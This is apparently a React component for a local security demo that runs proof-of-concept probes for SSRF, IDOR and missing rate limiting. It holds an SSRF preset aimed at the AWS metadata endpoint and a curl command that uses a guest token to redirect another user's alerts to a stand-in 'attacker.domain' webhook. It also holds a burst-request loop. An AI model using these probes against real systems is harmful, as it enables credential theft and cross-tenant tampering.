import React, { useState } from 'react';
import { 
  Cpu, 
  Play, 
  CheckCircle2, 
  AlertTriangle, 
  ShieldAlert, 
  Send, 
  Terminal, 
  HelpCircle,
  Copy,
  Check
} from 'lucide-react';

export const SafePocLab: React.FC = () => {
  const [selectedPoc, setSelectedPoc] = useState<'ssrf' | 'idor' | 'rate_limit'>('ssrf');
  const [targetUrl, setTargetUrl] = useState('http://127.0.0.1:6379/status');
  const [targetUserId, setTargetUserId] = useState('usr_director_general_04');
  const [running, setRunning] = useState(false);
  const [pocResult, setPocResult] = useState<any>(null);
  const [copied, setCopied] = useState(false);

  const runPoc = async () => {
    setRunning(true);
    setPocResult(null);

    let payload: any = {};
    if (selectedPoc === 'ssrf') payload = { targetUrl };
    if (selectedPoc === 'idor') payload = { userId: targetUserId };

    try {
      const res = await fetch('/api/poc/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          pocType: selectedPoc,
          payload
        })
      });
      const data = await res.json();
      setPocResult(data);
    } catch (err: any) {
      setPocResult({ error: err.message });
    } finally {
      setRunning(false);
    }
  };

  const copyCurl = () => {
    let curl = '';
    if (selectedPoc === 'ssrf') {
      curl = `curl -i "http://127.0.0.1:3000/api/rss-proxy?url=${encodeURIComponent(targetUrl)}"`;
    } else if (selectedPoc === 'idor') {
      curl = `curl -i -X POST http://127.0.0.1:3000/api/user-prefs \\\n  -H "Authorization: Bearer sess_guest_analyst_token" \\\n  -H "Content-Type: application/json" \\\n  -d '{"targetUserId": "${targetUserId}", "alertChannel": "https://attacker.domain/webhook"}'`;
    } else {
      curl = `for i in {1..15}; do curl -s -o /dev/null -w "%{http_code}\\n" http://127.0.0.1:3000/api/latest-brief & done`;
    }
    navigator.clipboard.writeText(curl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-6 pb-12">
      {/* Header */}
      <div className="bg-cyber-900 border border-cyber-700/60 rounded-xl p-5">
        <div className="flex items-center space-x-2 text-xs font-mono text-cyan-400 mb-1">
          <Cpu className="w-4 h-4 text-cyan-400" />
          <span>STAGE 3 & 7 // CONTROLLED DEMONSTRATION ENVIRONMENT</span>
        </div>
        <h1 className="text-xl font-bold text-white tracking-tight">
          Safe Proof-of-Concept (PoC) Runner
        </h1>
        <p className="text-xs text-slate-300 mt-1 max-w-3xl">
          Execute safe, non-destructive validation probes against the local World Monitor sandbox (`127.0.0.1`). Designed for live judge demonstrations to prove vulnerability exploitability without risk to availability or production data.
        </p>
      </div>

      {/* PoC Selector Tabs */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {/* PoC 1 */}
        <div
          onClick={() => { setSelectedPoc('ssrf'); setPocResult(null); }}
          className={`p-4 rounded-xl border transition cursor-pointer ${
            selectedPoc === 'ssrf'
              ? 'bg-cyber-850 border-cyan-500 shadow-[0_0_15px_rgba(0,240,255,0.15)]'
              : 'bg-cyber-900 border-cyber-800 hover:border-cyber-700'
          }`}
        >
          <div className="flex items-center justify-between text-xs font-mono">
            <span className="text-cyan-400 font-bold">PoC #1</span>
            <span className="px-1.5 py-0.5 rounded bg-rose-500/20 text-rose-300 text-[10px] font-bold">CRITICAL</span>
          </div>
          <h3 className="text-sm font-bold text-white mt-2">SSRF Internal Loopback Probe</h3>
          <p className="text-xs text-slate-400 mt-1">
            Target: <code className="text-slate-300 font-mono">/api/rss-proxy</code>. Demonstrates missing loopback IP sanitization.
          </p>
        </div>

        {/* PoC 2 */}
        <div
          onClick={() => { setSelectedPoc('idor'); setPocResult(null); }}
          className={`p-4 rounded-xl border transition cursor-pointer ${
            selectedPoc === 'idor'
              ? 'bg-cyber-850 border-cyan-500 shadow-[0_0_15px_rgba(0,240,255,0.15)]'
              : 'bg-cyber-900 border-cyber-800 hover:border-cyber-700'
          }`}
        >
          <div className="flex items-center justify-between text-xs font-mono">
            <span className="text-cyan-400 font-bold">PoC #2</span>
            <span className="px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-300 text-[10px] font-bold">HIGH</span>
          </div>
          <h3 className="text-sm font-bold text-white mt-2">BOLA/IDOR Object Mutation</h3>
          <p className="text-xs text-slate-400 mt-1">
            Target: <code className="text-slate-300 font-mono">/api/user-prefs</code>. Demonstrates cross-tenant preference tampering.
          </p>
        </div>

        {/* PoC 3 */}
        <div
          onClick={() => { setSelectedPoc('rate_limit'); setPocResult(null); }}
          className={`p-4 rounded-xl border transition cursor-pointer ${
            selectedPoc === 'rate_limit'
              ? 'bg-cyber-850 border-cyan-500 shadow-[0_0_15px_rgba(0,240,255,0.15)]'
              : 'bg-cyber-900 border-cyber-800 hover:border-cyber-700'
          }`}
        >
          <div className="flex items-center justify-between text-xs font-mono">
            <span className="text-cyan-400 font-bold">PoC #3</span>
            <span className="px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-300 text-[10px] font-bold">MEDIUM</span>
          </div>
          <h3 className="text-sm font-bold text-white mt-2">AI API Burst & Rate Limit Test</h3>
          <p className="text-xs text-slate-400 mt-1">
            Target: <code className="text-slate-300 font-mono">/api/latest-brief</code>. Demonstrates absence of throttling on LLM route.
          </p>
        </div>
      </div>

      {/* Interactive Execution Deck */}
      <div className="bg-cyber-900 border border-cyber-700/60 rounded-xl p-6 space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-cyber-800 pb-4">
          <div>
            <h2 className="text-base font-bold text-white tracking-tight flex items-center space-x-2">
              <span>Execution Parameter Setup</span>
              <span className="px-2 py-0.5 rounded bg-cyber-950 text-cyan-400 text-xs font-mono">
                {selectedPoc.toUpperCase()}
              </span>
            </h2>
            <p className="text-xs text-slate-400 mt-1">
              Configure parameters to reproduce this flaw safely.
            </p>
          </div>

          <div className="flex items-center space-x-2">
            <button
              onClick={copyCurl}
              className="px-3 py-2 rounded-lg bg-cyber-800 hover:bg-cyber-700 border border-cyber-600 text-xs font-mono text-slate-300 flex items-center space-x-1.5 transition cursor-pointer"
            >
              {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              <span>{copied ? 'cURL Copied' : 'Copy cURL Command'}</span>
            </button>

            <button
              onClick={runPoc}
              disabled={running}
              className="px-4 py-2 rounded-lg bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-black font-mono font-bold text-xs uppercase flex items-center space-x-1.5 transition shadow-[0_0_15px_rgba(0,240,255,0.2)] disabled:opacity-50 cursor-pointer"
            >
              <Send className="w-3.5 h-3.5 fill-black" />
              <span>{running ? 'Executing Safe Probe...' : 'Execute Live PoC'}</span>
            </button>
          </div>
        </div>

        {/* Input Parameters based on Selected PoC */}
        {selectedPoc === 'ssrf' && (
          <div className="space-y-2">
            <label className="text-xs font-mono text-slate-300 block">
              Injected Destination URL (Testing Internal Loopback Bypass):
            </label>
            <div className="flex space-x-2">
              <input
                type="text"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                className="flex-1 bg-cyber-950 border border-cyber-700 rounded-lg px-3 py-2 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-400"
              />
              <button
                onClick={() => setTargetUrl('http://169.254.169.254/latest/meta-data')}
                className="px-3 py-1 rounded bg-cyber-800 text-[11px] font-mono text-slate-300 hover:text-white"
              >
                AWS Metadata
              </button>
              <button
                onClick={() => setTargetUrl('http://127.0.0.1:6379/status')}
                className="px-3 py-1 rounded bg-cyber-800 text-[11px] font-mono text-slate-300 hover:text-white"
              >
                Redis Loopback
              </button>
            </div>
          </div>
        )}

        {selectedPoc === 'idor' && (
          <div className="space-y-2">
            <label className="text-xs font-mono text-slate-300 block">
              Target Victim User ID (Testing Cross-Tenant Modification):
            </label>
            <input
              type="text"
              value={targetUserId}
              onChange={(e) => setTargetUserId(e.target.value)}
              className="w-full bg-cyber-950 border border-cyber-700 rounded-lg px-3 py-2 text-xs font-mono text-amber-300 focus:outline-none focus:border-cyan-400"
            />
          </div>
        )}

        {selectedPoc === 'rate_limit' && (
          <div className="p-3 bg-cyber-950 rounded-lg border border-cyber-800 text-xs font-mono text-slate-300">
            <span>Test Profile: 15 concurrent HTTP requests dispatched to <code>/api/latest-brief</code> to evaluate throttling enforcement.</span>
          </div>
        )}

        {/* Live Output & Inspection Console */}
        {pocResult && (
          <div className="space-y-4 pt-2">
            <div className="p-4 rounded-xl bg-cyber-950 border border-cyber-700/80 space-y-3 font-mono text-xs">
              <div className="flex items-center justify-between border-b border-cyber-800 pb-2">
                <span className="text-cyan-400 font-bold flex items-center space-x-1.5">
                  <Terminal className="w-4 h-4" />
                  <span>TRANSACTION EVIDENCE STREAM</span>
                </span>
                <span className="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-400 text-[10px] font-bold">
                  SAFE EXECUTION CONFIRMED
                </span>
              </div>

              {/* Request */}
              <div>
                <span className="text-slate-500 block mb-1">CLIENT DISPATCH PAYLOAD:</span>
                <pre className="p-3 rounded bg-cyber-900 border border-cyber-800 text-slate-300 overflow-x-auto">
                  {JSON.stringify(pocResult.request, null, 2)}
                </pre>
              </div>

              {/* Response */}
              <div>
                <span className="text-slate-500 block mb-1">TARGET RESPONSE:</span>
                <pre className="p-3 rounded bg-cyber-900 border border-cyber-800 text-cyan-300 overflow-x-auto whitespace-pre-wrap">
                  {JSON.stringify(pocResult.response || pocResult.results, null, 2)}
                </pre>
              </div>

              {/* Analysis */}
              <div className="p-3 rounded bg-rose-950/30 border border-rose-500/40 text-rose-300 text-xs">
                <strong>VULNERABILITY ASSESSMENT:</strong> {pocResult.conclusion}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
